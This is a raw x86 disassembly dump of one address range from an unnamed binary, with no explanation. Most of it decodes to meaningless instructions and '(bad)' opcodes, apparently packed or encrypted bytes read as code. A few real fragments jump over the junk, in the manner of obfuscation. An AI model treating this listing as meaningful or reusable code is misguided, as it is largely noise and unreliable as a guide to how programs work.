  414272:	rol    DWORD PTR [ecx-0x47],1
  414275:	mov    bl,BYTE PTR [eax]
  414277:	inc    ebx
  414278:	retf   0x438e
  41427b:	mov    esp,0xe1085b61
  414280:	fidivr DWORD PTR [esi+ebp*4-0x21a4d393]
  414287:	pop    edi
  414288:	test   BYTE PTR [ecx+0x20],ah
  41428b:	and    al,0xf5
  41428d:	push   edi
  41428e:	push   edx
  41428f:	jmp    0x4142a4
  414291:	inc    edx
  414293:	in     al,0x3c
  414295:	add    eax,0x89e16652
  41429a:	xlat   BYTE PTR ds:[ebx]
  41429b:	push   ecx
  41429c:	mov    edx,0x90999b62
  4142a1:	fcom   DWORD PTR [ebp-0x2b]
  4142a4:	enter  0x602d,0xe1
  4142a8:	jae    0x414266
  4142aa:	mov    bl,0x87
  4142ac:	into   
  4142ad:	mov    edi,0xfde227c3
  4142b2:	(bad)  [edi+edx*4-0x3a]
  4142b6:	cmp    BYTE PTR [esi-0x3c],cl
  4142b9:	adc    al,0xbe
  4142bb:	hlt    
  4142bc:	lods   eax,DWORD PTR ds:[esi]
  4142bd:	or     al,0x23
  4142bf:	push   edx
  4142c0:	mov    WORD PTR [ecx],gs
  4142c2:	mov    al,ds:0x1ce28060
  4142c7:	inc    ebp
  4142c8:	test   BYTE PTR [eax-0xde15352],al
  4142ce:	sar    dl,0x61
  4142d1:	bnd jmp 0x41434d
  4142d4:	retf   
  4142d5:	inc    esi
  4142d6:	lock add eax,0x3140b748
  4142dc:	jns    0x4142e2
  4142de:	div    BYTE PTR [eax+0x5c81db69]
  4142e4:	jp     0x414355
  4142e6:	jecxz  0x4142a4
  4142e8:	cmp    eax,0x9c031f1c
  4142ed:	sub    eax,0x804a35f8
  4142f2:	mov    eax,ds:0x5aa9ed44
  4142f7:	mov    ebp,0x3a505355
  4142fc:	lods   eax,DWORD PTR ds:[esi]
  4142fd:	sub    al,0x83
  4142ff:	fcom   DWORD PTR ds:0x4ba2f8fd
  414305:	aas    
  414306:	inc    ecx
  414307:	dec    edx
  414308:	jmp    0xd6bf:0x99acf4c1
  41430f:	inc    esi
  414310:	jns    0x414382
  414312:	sbb    bh,BYTE PTR [eax-0x21]
  414315:	push   cs
  414316:	ja     0x41435f
  414318:	jge    0x414363
  41431a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41431b:	rol    DWORD PTR [ecx+0x75bec28c],0x9b
  414322:	aaa    
  414323:	xchg   BYTE PTR [esi-0x4ef43b82],dh
  414329:	mov    dl,0xf2
  41432b:	neg    BYTE PTR [ecx]
  41432d:	outs   dx,DWORD PTR ds:[esi]
  41432e:	test   DWORD PTR [edi+eiz*4],ebx
  414331:	pop    ecx
  414332:	sbb    eax,0xb80ea93f
  414337:	pop    eax
  414338:	xor    BYTE PTR [ebx+edi*2+0x30],dl
  41433c:	and    BYTE PTR [ecx-0x6d],cl
  41433f:	fwait
  414340:	mov    cl,0xa2
  414342:	ret    0x9c74
  414345:	xchg   esp,eax
  414346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414347:	imul   esi,esi,0x7844ffd2
  41434d:	mov    ebp,0xb7ad3a87
  414352:	pop    edi
  414353:	popf   
  414354:	or     eax,DWORD PTR [edi-0x3f]
  414357:	retf   0x8a8f
  41435a:	ret    
  41435b:	mov    ds:0x2fec1be1,al
  414360:	test   al,0xca
  414362:	(bad)  
  414363:	pop    ss
  414364:	ds mov ebp,0xd4acf486
  41436a:	push   es
  41436b:	dec    esi
  41436c:	xor    eax,0xf4317b3a
  414371:	data16 js 0x414326
  414374:	clc    
  414375:	in     al,0xb5
  414377:	stos   DWORD PTR es:[edi],eax
  414378:	(bad)  
  41437a:	sbb    eax,0xfd63a3a2
  41437f:	fwait
  414380:	std    
  414381:	mov    dh,0x2d
  414383:	push   edx
  414384:	xchg   ebx,eax
  414385:	outs   dx,DWORD PTR ds:[esi]
  414386:	daa    
  414387:	pop    esp
  414388:	gs or  eax,0xe018a5cf
  41438e:	into   
  41438f:	(bad)  
  414390:	popa   
  414391:	dec    edx
  414392:	out    dx,al
  414393:	pop    es
  414394:	mov    DWORD PTR [ebp+ecx*8-0x7e71edee],ebx
  41439b:	lahf   
  41439c:	pop    esi
  41439d:	push   esi
  41439e:	js     0x414334
  4143a0:	mov    edx,0x655fe8f0
  4143a5:	pop    es
  4143a6:	call   FWORD PTR [esi]
  4143a8:	stc    
  4143a9:	mov    bh,0xe3
  4143ab:	test   DWORD PTR [eax+0x4c],ebx
  4143ae:	sub    al,0x99
  4143b0:	ss loop 0x4143b2
  4143b3:	scas   eax,DWORD PTR es:[edi]
  4143b4:	cmp    al,0x6b
  4143b6:	test   eax,0x8dd12bba
  4143bb:	mov    esp,0x3272981f
  4143c0:	add    BYTE PTR [ebx],bh
  4143c2:	cli    
  4143c3:	jbe    0x4129d7
  4143c9:	mov    edx,DWORD PTR [ebp-0xc]
  4143cc:	mov    edi,DWORD PTR [ebp-0x24]
  4143cf:	xor    edx,eax
  4143d1:	add    edx,ecx
  4143d3:	jmp    0x41465b
  4143d8:	(bad)
  4143db:	rcr    bl,1
  4143dd:	fcmovb st,st(5)
  4143df:	rol    DWORD PTR [ebx-0x7f],1
  4143e2:	add    ecx,ebp
  4143e4:	sbb    eax,esp
  4143e6:	sub    DWORD PTR [ecx],ebp
  4143e8:	ror    DWORD PTR [ecx],0x7f
  4143eb:	js     0x4143d2
  4143ed:	jle    0x414467
  4143ef:	js     0x41444e
  4143f1:	and    DWORD PTR [edi+0x13],ebx
  4143f4:	aad    0x77
  4143f6:	push   es
  4143f7:	fsubr  st(1),st
  4143f9:	cdq    
  4143fa:	cli    
  4143fb:	jg     0x414454
  4143fd:	jb     0x414422
  4143ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414400:	in     al,dx
  414401:	sti    
  414402:	hlt    
  414403:	push   ebx
  414404:	add    DWORD PTR [edx-0x1d967b0f],esp
  41440a:	les    edx,FWORD PTR ds:0xbf2ac52a
  414410:	add    BYTE PTR [ebp+0x19daac77],cl
  414416:	push   0xba4794bd
  41441b:	adc    bh,BYTE PTR [edx+0xd]
  41441e:	out    0x37,al
  414420:	push   ebx
  414421:	mov    bh,0x23
  414423:	imul   esp,eax,0x6d259363
  414429:	mov    ds:0xf41d8f22,al
  41442e:	lods   al,BYTE PTR ds:[esi]
  41442f:	push   ss
  414430:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414431:	dec    edi
  414432:	das    
  414433:	scas   al,BYTE PTR es:[edi]
  414434:	mov    BYTE PTR [ecx+0x238c77c8],bh
  41443a:	jmp    0x5836b7b8
  41443f:	ror    BYTE PTR [esi-0x5320d593],1
  414445:	arpl   si,cx
  414447:	xchg   ebp,eax
  414448:	dec    esp
  414449:	test   al,0x32
  41444b:	fwait
  41444c:	int    0x61
  41444e:	or     eax,0xef6f7efb
  414453:	xor    bl,0x1a
  414456:	and    BYTE PTR [edi+0x74],al
  414459:	mov    ch,0xc2
  41445b:	push   edx
  41445c:	iret   
  41445d:	cs dec ebx
  41445f:	shr    DWORD PTR [ebx-0x59db0b06],0x95
  414466:	pop    ds
  414467:	pushf  
  414468:	dec    ebp
  414469:	jno    0x4143eb
  41446b:	nop
  41446c:	out    dx,al
  41446d:	aaa    
  41446e:	ins    BYTE PTR es:[edi],dx
  41446f:	sbb    al,0x3f
  414471:	or     al,0x4a
  414473:	out    0xa2,eax
  414475:	repnz mov eax,ds:0x97a266c1
  41447b:	test   al,0x9a
  41447d:	adc    esi,DWORD PTR [edi]
  41447f:	in     eax,0xf7
  414481:	push   cs
  414482:	and    ecx,esp
  414484:	mov    bl,0x9d
  414486:	push   ebp
  414487:	sbb    BYTE PTR [edx-0x24e74e7a],dh
  41448d:	sar    DWORD PTR [ecx],1
  41448f:	or     BYTE PTR cs:[edi-0x48cb966d],0x1a
  414497:	pushf  
  414498:	push   ss
  414499:	iret   
  41449a:	ins    DWORD PTR es:[edi],dx
  41449b:	not    BYTE PTR [ebx+0xcf24677]
  4144a1:	sbb    BYTE PTR [ecx+0x24340c4e],al
  4144a7:	mov    ebp,0xdb3b36
  4144ac:	mov    BYTE PTR [ecx],bl
  4144ae:	or     DWORD PTR [esi],esi
  4144b0:	add    al,BYTE PTR [ecx]
  4144b2:	pusha  
  4144b3:	or     ecx,DWORD PTR [edx+0x74]
  4144b6:	jmp    0x36ebbc2e
  4144bb:	lods   eax,DWORD PTR ds:[esi]
  4144bc:	enter  0x1cce,0xff
  4144c0:	fist   DWORD PTR [ecx+0x6f]
  4144c3:	add    al,0x85
  4144c5:	xor    BYTE PTR [edx],cl
  4144c7:	or     bl,ch
  4144c9:	cs jl  0x41449a
  4144cc:	(bad)  
  4144cd:	jmp    0x414541
  4144cf:	daa    
  4144d0:	jno    0x4144e2
  4144d2:	fiadd  WORD PTR [edi]
  4144d4:	adc    ecx,eax
  4144d6:	test   al,0x67
  4144d8:	jmp    0x456286d0
  4144dd:	fisttp DWORD PTR [eax+edi*8-0x53cb6f21]
  4144e4:	call   0x7081760
  4144e9:	retf   
  4144ea:	jge    0x414517
  4144ec:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4144ee:	std    
  4144ef:	aad    0xc4
  4144f1:	push   esi
  4144f2:	push   eax
  4144f3:	jne    0x41456c
  4144f5:	inc    ebp
  4144f6:	jle    0x4144ce
  4144f8:	je     0x4144df
  4144fa:	ror    DWORD PTR [ebp+0x7c],0xc3
  4144fe:	ss push ds
  414500:	pusha  
  414501:	add    bl,dh
  414503:	scas   al,BYTE PTR es:[edi]
  414504:	pop    edi
  414505:	dec    esp
  414506:	jl     0x414547
  414508:	or     eax,DWORD PTR [ecx+ebp*1+0x4f]
  41450c:	(bad)  
  41450d:	out    0xa0,al
  41450f:	lods   eax,DWORD PTR ds:[esi]
  414510:	sar    BYTE PTR [ecx+0x1],0x92
  414514:	retf   
  414515:	inc    esi
  414516:	add    al,0x78
  414518:	pop    esp
  414519:	scas   eax,DWORD PTR es:[edi]
  41451a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41451b:	cmp    DWORD PTR [ecx-0x29699a40],ebx
  414521:	dec    ebp
  414522:	adc    esi,DWORD PTR [ecx-0xf]
  414525:	xchg   esi,eax
  414526:	pop    eax
  414527:	add    DWORD PTR ds:0xe5626c9e,edi
  41452d:	sub    ch,BYTE PTR [esi+0x74b2cfd7]
  414533:	nop
  414534:	add    ebp,ecx
  414536:	dec    edi
  414537:	pop    esp
  414538:	sbb    dl,BYTE PTR [edi-0x7c]
  41453b:	call   0x8482:0x1ddd0729
  414542:	jb     0x4144fa
  414544:	sbb    BYTE PTR [esi-0x57],ah
  414547:	adc    dl,BYTE PTR [edi+0x25]
  41454a:	cmp    eax,0x8e03e2f7
  41454f:	mov    dh,0xcb
  414551:	inc    esi
  414552:	pushf  
  414553:	js     0x4144fc
  414555:	mov    ds:0xab5a71c7,eax
  41455a:	cwde   
  41455b:	in     eax,0xfa
  41455d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41455e:	pop    esp
  41455f:	pop    es
  414560:	(bad)
  414564:	mov    ah,BYTE PTR [ecx-0x651aa40b]
  41456a:	fbld   TBYTE PTR [ecx]
  41456c:	cmp    cl,al
  41456e:	dec    edi
  41456f:	clc    
  414570:	cmp    BYTE PTR ds:0xc7b6baeb,bl
  414576:	or     al,0xb9
  414578:	pop    eax
  414579:	popa   
  41457a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41457b:	push   edi
  41457c:	jno    0x41457f
  41457e:	jmp    0x55ac:0x50db21c3
  414585:	mov    esi,0x2116e261
  41458a:	clc    
  41458b:	jle    0x4145ad
  41458d:	or     eax,0x6f8ae1cd
  414592:	adc    al,0x9e
  414594:	test   al,0x72
  414596:	add    edx,DWORD PTR [ebx-0x11]
  414599:	inc    edx
  41459a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41459b:	or     ebx,DWORD PTR [esp+eax*8]
  41459e:	ret    0x78d2
  4145a1:	mov    esi,0x90ec8468
  4145a6:	or     DWORD PTR [ecx-0x14caab6],ebp
  4145ac:	mov    bh,0x9
  4145ae:	cmp    BYTE PTR [ebx+0x5dfb2c90],ch
  4145b4:	mov    ah,0x12
  4145b6:	(bad)  
  4145b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145b8:	gs and eax,0xe56481e3
  4145be:	or     al,0x30
  4145c0:	out    0xb8,eax
  4145c2:	mov    dh,0x10
  4145c4:	mov    ah,bl
  4145c6:	test   BYTE PTR [edx-0xf],dh
  4145c9:	sbb    BYTE PTR [ecx-0x71dba354],cl
  4145cf:	fcomip st,st(1)
  4145d1:	fs pop ds
  4145d3:	xchg   edi,eax
  4145d4:	ret    
  4145d5:	jb     0x4145b3
  4145d7:	imul   esp,DWORD PTR [edi-0x7d535196],0x5c
  4145de:	gs push edx
  4145e0:	jp     0x414623
  4145e2:	jg     0x4145f3
  4145e4:	fidiv  DWORD PTR ds:0x9f068663
  4145ea:	xor    al,0xda
  4145ec:	xlat   BYTE PTR ds:[ebx]
  4145ed:	shr    DWORD PTR [ecx-0x3ce74e15],1
  4145f3:	test   BYTE PTR [ebx+0x0],ch
  4145f6:	cmp    ebx,edx
  4145f8:	push   ss
  4145f9:	ret    0xa0d2
  4145fc:	dec    esp
  4145fd:	clc    
  4145fe:	xchg   edi,eax
  4145ff:	mov    ah,0x57
  414601:	sub    al,dl
  414603:	in     al,0x21
  414605:	les    esp,FWORD PTR [edx+0x75981fb8]
  41460b:	js     0x414657
  41460d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41460e:	jmp    0x59b4e0
  414613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414614:	push   edi
  414615:	pop    esi
  414616:	pop    ebp
  414617:	xor    al,0x2a
  414619:	xchg   al,bl
  41461b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41461c:	sub    BYTE PTR [ebx+0x341f1c8],bh
  414622:	outs   dx,DWORD PTR ds:[esi]
  414623:	xor    BYTE PTR [edi-0x64c79398],0x3e
  41462a:	pop    esi
  41462b:	iret   
  41462c:	or     eax,0xa71475a3
  414631:	jno    0x414610
  414633:	pop    edx
  414634:	sbb    cl,ch
  414636:	fisubr DWORD PTR [edi-0x69]
  414639:	push   es
  41463a:	cmp    eax,0x5e397975
  41463f:	ret    0xde64
  414642:	mov    esi,0xcab86c6e
  414647:	push   ss
  414648:	shr    edi,0x26
  41464b:	je     0x41462b
  41464d:	mov    fs,WORD PTR [edx]
  41464f:	lods   al,BYTE PTR ds:[esi]
  414650:	xchg   edx,eax
  414651:	adc    DWORD PTR [eax-0x7d65fa57],ebp
  414657:	pop    ss
  414658:	mov    BYTE PTR [esi+0x3b],bl
  41465b:	imul   edx,edi
  41465e:	mov    edi,DWORD PTR [ebp-0x18]
  414661:	jmp    0x4148e9
  414666:	retf   
  414667:	ret    0xd23d
  41466a:	vpand  xmm3,xmm5,xmm1
  41466e:	ret    0xb492
  414671:	add    dl,0x3e
  414674:	mov    ah,0x69
  414676:	scas   al,BYTE PTR es:[edi]
  414677:	movq   QWORD PTR [eax-0x1b],mm7
  41467b:	jle    0x4146f5
  41467d:	js     0x414695
  41467f:	jns    0x4146a0
  414681:	pop    eax
  414682:	ss mov edx,0xcd5083af
  414688:	repnz (bad) 
  41468a:	mov    BYTE PTR [ebx-0x4caf82d5],dh
  414690:	mov    dl,0x40
  414692:	out    0xd,al
  414694:	dec    esp
  414695:	test   DWORD PTR [esi-0x5e],ebp
  414698:	lock mov edi,0x218cc4c2
  41469e:	sub    edx,DWORD PTR [edi]
  4146a0:	call   FWORD PTR [esi-0x4c6b4987]
  4146a6:	mov    cl,0xfa
  4146a8:	arpl   WORD PTR [ebx+0x58],bp
  4146ab:	pop    edx
  4146ac:	dec    edi
  4146ad:	jns    0x414705
  4146af:	or     ah,BYTE PTR [ecx+0x62492cd]
  4146b5:	push   ss
  4146b6:	cwde   
  4146b7:	fimul  WORD PTR [ebx+edx*8]
  4146ba:	mov    edx,0x12fc47df
  4146bf:	addr16 (bad) 
  4146c1:	ins    DWORD PTR es:[edi],dx
  4146c2:	add    al,0x89
  4146c4:	test   al,0xf4
  4146c6:	sub    esi,DWORD PTR [esi+0x235311d]
  4146cc:	mov    ch,BYTE PTR [ecx+0x67f18fe0]
  4146d2:	and    BYTE PTR [ebp+0x2f],0x6
  4146d6:	add    dl,BYTE PTR [edi-0x24028bf3]
  4146dc:	cli    
  4146dd:	shr    edi,0x6b
  4146e0:	inc    esi
  4146e1:	or     dh,al
  4146e3:	ins    DWORD PTR es:[edi],dx
  4146e4:	das    
  4146e5:	sub    edx,ebp
  4146e7:	in     eax,dx
  4146e8:	aas    
  4146e9:	icebp  
  4146ea:	daa    
  4146eb:	leave  
  4146ec:	scas   eax,DWORD PTR es:[edi]
  4146ed:	push   esp
  4146ee:	not    BYTE PTR ds:0x8512e00
  4146f4:	and    DWORD PTR [edi+ebp*1+0x38],esp
  4146f8:	mov    ebp,0xea5f7032
  4146fd:	sub    edx,DWORD PTR ds:0x3832da22
  414703:	leave  
  414704:	ret    
  414705:	sbb    al,0xfc
  414707:	icebp  
  414708:	pop    esi
  414709:	add    DWORD PTR [ecx],0x32
  41470c:	jo     0x41469b
  41470e:	stos   BYTE PTR es:[edi],al
  41470f:	mov    WORD PTR [eax+edi*8+0x7b],gs
  414713:	mov    DWORD PTR [ecx-0x15],ebx
  414716:	dec    eax
  414717:	icebp  
  414718:	mov    BYTE PTR [ebp-0x59d90f99],dl
  41471e:	jno    0x41473a
  414720:	cld    
  414721:	push   edx
  414722:	ss pop es
  414724:	jg     0x4146ec
  414726:	iret   
  414727:	pop    esi
  414728:	mov    edx,0xc2c3538f
  41472d:	ret    0xee41
  414730:	(bad)  
  414731:	retf   0xf25b
  414734:	mov    dh,0xb4
  414736:	sbb    eax,0x958545c4
  41473b:	fdivr  QWORD PTR [edx+ecx*1]
  41473e:	je     0x4146d7
  414740:	js     0x41477e
  414742:	daa    
  414743:	clc    
  414744:	nop    esi
  414747:	add    al,0x39
  414749:	sub    al,BYTE PTR ds:[ebx-0x21]
  41474d:	push   0xedb5e4b8
  414752:	or     bl,BYTE PTR [ebp+eiz*8+0x26]
  414756:	je     0x414722
  414758:	retf   
  414759:	add    DWORD PTR [edi-0x559f9a3],edi
  41475f:	xchg   ebp,eax
  414760:	add    eax,0x494d388e
  414765:	jns    0x41473d
  414767:	in     al,dx
  414768:	and    edx,DWORD PTR [eax-0x3b]
  41476b:	mul    ebx
  41476d:	ret    0x7a60
  414770:	and    BYTE PTR [edx+0x19747c00],ah
  414776:	scas   al,BYTE PTR es:[edi]
  414777:	cmp    bl,BYTE PTR [edx+0x1a]
  41477a:	xor    DWORD PTR [eax+0x44],edi
  41477d:	cmp    esp,DWORD PTR [ebx-0x65]
  414780:	jg     0x414709
  414782:	aas    
  414783:	xchg   ebp,eax
  414784:	or     cl,cl
  414786:	gs fs test al,0x88
  41478a:	icebp  
  41478b:	sbb    al,0xfd
  41478d:	xchg   BYTE PTR [ebx+0xb],al
  414790:	in     eax,0x82
  414792:	neg    BYTE PTR [ecx+0x4eff981f]
  414798:	adc    al,0x63
  41479a:	in     al,0xac
  41479c:	pushf  
  41479d:	out    0xb4,al
  41479f:	mov    fs,edi
  4147a1:	push   eax
  4147a2:	push   cs
  4147a3:	xlat   BYTE PTR ds:[ebx]
  4147a4:	outs   dx,DWORD PTR ds:[esi]
  4147a5:	jbe    0x414760
  4147a7:	dec    esp
  4147a8:	(bad)  
  4147a9:	shl    DWORD PTR [ebx-0x5d],1
  4147ac:	les    esp,FWORD PTR ds:0xedba11e0
  4147b2:	mov    ah,0xfe
  4147b4:	push   ebx
  4147b5:	xor    esp,ebx
  4147b7:	icebp  
  4147b8:	dec    eax
  4147b9:	mov    cs,WORD PTR [esi+0x479907d2]
  4147bf:	push   0x24a26797
  4147c4:	fisttp DWORD PTR [eax-0x71]
  4147c7:	rol    DWORD PTR [esp+ecx*2],cl
  4147ca:	cmp    al,0x69
  4147cc:	in     eax,dx
  4147cd:	jns    0x414829
  4147cf:	ror    DWORD PTR [ecx],cl
  4147d1:	sub    dl,0x97
  4147d4:	ins    DWORD PTR es:[edi],dx
  4147d5:	pop    edi
  4147d6:	mov    bl,0x8e
  4147d8:	dec    esi
  4147d9:	js     0x41478e
  4147db:	mov    ebx,0x66435713
  4147e0:	aam    0x7b
  4147e2:	sub    BYTE PTR [eax+0x199b4381],bh
  4147e8:	mov    cl,0xbc
  4147ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147eb:	push   edx
  4147ec:	(bad)  
  4147ed:	outs   dx,DWORD PTR ds:[esi]
  4147ee:	mov    ecx,0x7b9176a4
  4147f3:	sub    ah,BYTE PTR [esi+0x76]
  4147f6:	mov    ah,0x5
  4147f8:	fisttp DWORD PTR [ebx-0x15]
  4147fb:	cmc    
  4147fc:	ins    BYTE PTR es:[edi],dx
  4147fd:	stos   DWORD PTR es:[edi],eax
  4147fe:	sbb    BYTE PTR [ebx+0x4b],ah
  414801:	das    
  414802:	loope  0x414869
  414804:	(bad)  
  414805:	shl    DWORD PTR [ecx-0x1d54211f],1
  41480b:	xchg   edx,eax
  41480c:	in     eax,0x71
  41480e:	in     al,0x15
  414810:	aas    
  414811:	dec    ebp
  414812:	std    
  414813:	std    
  414814:	repz ficom DWORD PTR [eax]
  414817:	imul   ecx,DWORD PTR [eax],0x33
  41481a:	add    al,0x24
  41481c:	std    
  41481d:	aaa    
  41481e:	add    BYTE PTR [edi],ch
  414820:	jl     0x4147c3
  414822:	adc    eax,ebx
  414824:	add    edi,DWORD PTR [ebx]
  414826:	mov    ah,0x36
  414828:	sti    
  414829:	es and al,0x6a
  41482c:	mov    bh,BYTE PTR [edx-0x62f7a650]
  414832:	scas   eax,DWORD PTR es:[edi]
  414833:	aam    0x40
  414835:	jnp    0x414817
  414837:	(bad)  
  414838:	loop   0x414850
  41483a:	mov    BYTE PTR [eax],bl
  41483c:	popf   
  41483d:	dec    ecx
  41483e:	jae    0x4147e4
  414840:	aaa    
  414841:	sbb    BYTE PTR [edx-0x7d5bf37],al
  414847:	push   esp
  414848:	jbe    0x41484b
  41484a:	add    eax,0xee4000f8
  41484f:	scas   al,BYTE PTR es:[edi]
  414850:	je     0x414818
  414852:	(bad)  [edx]
  414854:	cmp    eax,DWORD PTR ds:0x45ecee4
  41485a:	mov    ebp,0xa1207cbd
  41485f:	clc    
  414860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414861:	shl    DWORD PTR [edi-0x3c],0xa5
  414865:	adc    DWORD PTR [ecx+0x71e2e8c8],0x9ba4de2c
  41486f:	or     eax,0x90a42490
  414874:	js     0x41486e
  414876:	jno    0x4148d1
  414878:	lock inc ebp
  41487a:	adc    dh,BYTE PTR ds:0x4030e36
  414880:	lahf   
  414881:	repnz mov BYTE PTR [eax+0x50],0x1a
  414886:	stc    
  414887:	repz mul BYTE PTR [ebx+eiz*1]
  41488b:	sbb    BYTE PTR [ecx+0x1bb8eb88],bh
  414891:	enter  0x4305,0x6e
  414895:	adc    BYTE PTR [edi-0x42],bl
  414898:	add    BYTE PTR [edx+0x569d03c9],dl
  41489e:	inc    esp
  41489f:	pop    edi
  4148a0:	test   al,0xb1
  4148a2:	loopne 0x4148df
  4148a4:	sbb    al,0x8f
  4148a6:	lods   eax,DWORD PTR ds:[esi]
  4148a7:	ins    BYTE PTR es:[edi],dx
  4148a8:	fild   WORD PTR [edx-0x1227d217]
  4148ae:	inc    eax
  4148af:	ret    
  4148b0:	in     eax,0x9a
  4148b2:	mul    DWORD PTR [eax-0x35cf54de]
  4148b8:	xor    eax,0xea41919a
  4148bd:	ret    0x3a08
  4148c0:	mov    ebp,0xd508dd1e
  4148c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148c6:	into   
  4148c7:	jge    0x4148de
  4148c9:	add    al,0x64
  4148cb:	icebp  
  4148cc:	adc    BYTE PTR [ecx+0x5adf4253],bl
  4148d2:	outs   dx,BYTE PTR ds:[esi]
  4148d3:	lock and dh,BYTE PTR [ebp-0x3d06882]
  4148da:	outs   dx,BYTE PTR ds:[esi]
  4148db:	rol    DWORD PTR [edx],0xa0
  4148de:	pusha  
  4148df:	in     eax,0x56
  4148e1:	jmp    0x79e9:0x58902fec
  4148e8:	fdiv   QWORD PTR [ebx]
  4148ea:	clc    
  4148eb:	add    edx,edi
  4148ed:	mov    edi,DWORD PTR [ebp-0x8]
  4148f0:	lea    edx,[edx+edi*1+0x327298]
  4148f7:	mov    DWORD PTR [ebp-0x8],edx
  4148fa:	mov    edx,DWORD PTR [ebp-0x20]
  4148fd:	xor    edx,eax
  4148ff:	mov    edi,0xffcd8d68
  414904:	sub    edi,edx
  414906:	add    edi,DWORD PTR [ebp-0x10]
  414909:	mov    edx,DWORD PTR [ebp-0x20]
  41490c:	mov    ebx,DWORD PTR [ebp-0x8]
  41490f:	jmp    0x414b97
  414914:	rcl    bh,0xc5
  414917:	(bad)  
  414918:	aad    0xda
  41491a:	leave  
  41491b:	(bad)  [eax-0xd87ab5]
  414921:	fadd   DWORD PTR [ebx+0x7f0c1ba8]
  414927:	js     0x41490e
  414929:	jle    0x4149a3
  41492b:	js     0x414935
  41492d:	std    
  41492e:	xchg   eax,esi
  414930:	ins    DWORD PTR es:[edi],dx
  414931:	mov    WORD PTR [edx],gs
  414933:	inc    esp
  414934:	pop    ecx
  414935:	popf   
  414936:	popa   
  414937:	retf   
  414938:	cmp    al,0x99
  41493a:	add    ch,BYTE PTR [esi+0x441d942b]
  414940:	push   es
  414941:	fnstsw WORD PTR [ebx+0xa8dfa0f]
  414947:	pop    ds
  414948:	mov    ds:0x4ffc948a,al
  41494d:	sbb    bl,BYTE PTR [edx]
  41494f:	jnp    0x41492b
  414951:	mov    ch,0x55
  414953:	mov    edx,0xe4783cf7
  414958:	mov    bl,0xc6
  41495a:	popa   
  41495b:	stc    
  41495c:	jge    0x414946
  41495e:	test   DWORD PTR [edi],0xf17b7d19
  414964:	jno    0x41491b
  414966:	lods   al,BYTE PTR ds:[esi]
  414967:	sub    BYTE PTR [ebp-0x5c],cl
  41496a:	sbb    DWORD PTR [ebx],ebp
  41496c:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41496e:	fnstcw WORD PTR gs:[ebx-0x52]
  414972:	sub    eax,0x34b3acf1
  414977:	rol    ah,0xb0
  41497a:	retf   
  41497b:	push   cs
  41497c:	in     eax,dx
  41497d:	ins    DWORD PTR es:[edi],dx
  41497e:	stos   DWORD PTR es:[edi],eax
  41497f:	push   ds
  414980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414981:	sub    esi,DWORD PTR [esi+ebx*4]
  414984:	push   esp
  414985:	mov    ch,0xbb
  414987:	enter  0xc520,0xff
  41498b:	xchg   ebp,eax
  41498c:	int    0xb3
  41498e:	outs   dx,BYTE PTR ds:[esi]
  41498f:	jae    0x414963
  414991:	inc    ecx
  414992:	in     eax,dx
  414993:	mov    edi,0x891c11c0
  414998:	mov    dl,0x5a
  41499a:	add    bl,dl
  41499c:	adc    DWORD PTR [ebx+ecx*1-0x4c],edi
  4149a0:	inc    eax
  4149a1:	fimul  WORD PTR [ecx+0x5f67655c]
  4149a7:	cmp    ecx,DWORD PTR [edx-0xa67e722]
  4149ad:	je     0x4149fd
  4149af:	cli    
  4149b0:	jl     0x4149a0
  4149b2:	xlat   BYTE PTR ds:[ebx]
  4149b3:	aad    0xa7
  4149b5:	xchg   ecx,eax
  4149b6:	retf   
  4149b7:	test   esp,edi
  4149b9:	(bad)  
  4149ba:	dec    edx
  4149bb:	fiadd  DWORD PTR [ecx+0x24]
  4149be:	(bad)  
  4149bf:	pop    edx
  4149c0:	gs (bad) 
  4149c2:	cdq    
  4149c3:	and    al,0x45
  4149c5:	out    dx,eax
  4149c6:	jmp    0x2805798a
  4149cb:	ja     0x414958
  4149cd:	imul   edx,DWORD PTR [edi-0x4c9f830e],0xffffffa5
  4149d4:	jp     0x414966
  4149d6:	shr    DWORD PTR [ecx+0x77],0x11
  4149da:	or     eax,0xcf7f9018
  4149df:	cmp    BYTE PTR [ecx-0x4aa4f0e0],cl
  4149e5:	aas    
  4149e6:	shl    DWORD PTR [esi-0x34cfd0ad],1
  4149ec:	addr16 mov ds:0x7e19,eax
  4149f0:	or     BYTE PTR [edx+eiz*8-0x5e71a75f],ch
  4149f7:	sub    esp,DWORD PTR [edx+0x468ec7ed]
  4149fd:	scas   eax,DWORD PTR es:[edi]
  4149fe:	jmp    0x414a6e
  414a00:	jb     0x414a0a
  414a02:	dec    eax
  414a03:	rcr    DWORD PTR [eax],1
  414a05:	jno    0x4149c1
  414a07:	add    al,0xff
  414a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a0a:	(bad)  
  414a0b:	js     0x414a3b
  414a0d:	mov    dl,0x77
  414a0f:	int3   
  414a10:	pop    ss
  414a11:	leave  
  414a12:	pop    es
  414a13:	gs (bad) 
  414a16:	idiv   bh
  414a18:	sub    edi,DWORD PTR [ebp-0x9c31bf3]
  414a1e:	icebp  
  414a1f:	lahf   
  414a20:	dec    edi
  414a21:	cmp    BYTE PTR [edx-0x15],bh
  414a24:	mov    esp,0xc2f5eb0c
  414a29:	cs xor bl,0xf9
  414a2d:	test   al,0x2d
  414a2f:	jge    0x4149ec
  414a31:	popa   
  414a32:	mov    ah,ch
  414a34:	push   eax
  414a35:	mov    bl,0x88
  414a37:	push   esi
  414a38:	pop    ecx
  414a39:	xor    eax,0x351e3235
  414a3e:	in     al,0x70
